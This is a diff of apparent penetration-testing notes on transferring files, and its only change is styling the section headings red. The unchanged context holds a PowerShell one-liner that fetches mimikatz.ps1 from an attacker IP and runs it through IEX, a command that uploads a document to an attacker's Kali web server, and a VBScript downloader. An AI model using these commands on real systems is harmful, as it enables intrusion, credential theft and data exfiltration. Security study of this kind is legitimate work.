@@ -26,7 +26,7 @@ Start-BitsTransfer -Source $url -Destination $output
 Start-BitsTransfer -Source $url -Destination $output -Asynchronous
 ```
 
-## Linux HTTP Server
+## <mark style="color:red;">Linux HTTP Server</mark>
 
 ```
 python -m SimpleHTTPServer 80
@@ -36,7 +36,7 @@ ruby -run -e httpd . -p 9000
 nc -kl 8000 --sh-exec "echo -e 'HTTP/1.1 200 OK\r\n'; date"
 ```
 
-## Python HTTPS Server
+## <mark style="color:red;">Python HTTPS Server</mark>
 
 ```python
 # from https://gist.github.com/dergachev/7028596
@@ -56,7 +56,7 @@ httpd.socket = ssl.wrap_socket (httpd.socket, certfile='./server.pem', server_si
 httpd.serve_forever()
 ```
 
-## HTTP/FTP wget from linux
+## <mark style="color:red;">HTTP/FTP wget from linux</mark>
 
 ```
 wget http://ip-addr[:port]/file[-o output-file]
@@ -64,7 +64,7 @@ wget http://ip-addr[:port]/file[-o output-file]
 
 #### A lesser known usage of wget is its ability to download FTP files as well. To do that, simply prepend a ftp:// before the URL. If the FTP server needs credentials, specify them with --ftp-user=username and --ftp-password=pass.
 
-## HTTP powershell from windows
+## <mark style="color:red;">HTTP powershell from windows</mark>
 
 #### oneliner command:
 
@@ -99,7 +99,7 @@ or
 (new-object System.Net.Webclient).DownloadString('http://192.168.50.34:8080/mimikatz.ps1') | IEX
 ```
 
-## http VBscript from windows
+## <mark style="color:red;">http VBscript from windows</mark>
 
 #### run these commands in order to create a vbscrtipt for downloading a file
 
@@ -136,7 +136,7 @@ echo ts.Close >> wget.vbs
 cscript wget.vbs http://ip-addr:port/file output-file
 ```
 
-## Windows Uploads Using Windows Scripting Languages
+## <mark style="color:red;">Windows Uploads Using Windows Scripting Languages</mark>
 
 #### since standard TFTP, FTP, and HTTP servers are rarely enabled on Windows by default if outbound HTTP traffic is allowed, we can use the System.Net.WebClient PowerShell class to upload data to our Kali machine through an HTTP POST request create the following PHP script and save it as upload.php in our Kali webroot directory, /var/www/html:will process an incoming file upload request and save the transferred data to the /var/www/uploads/ directory.
 
@@ -159,7 +159,7 @@ sudo chown www-data: /var/www/uploads
 C:\Users> powershell (New-Object System.Net.WebClient).UploadFile('http://10.11.0.4/upload.php', 'important.docx')
 ```
 
-## Upload Files
+## <mark style="color:red;">Upload Files</mark>
 
 #### python script
 
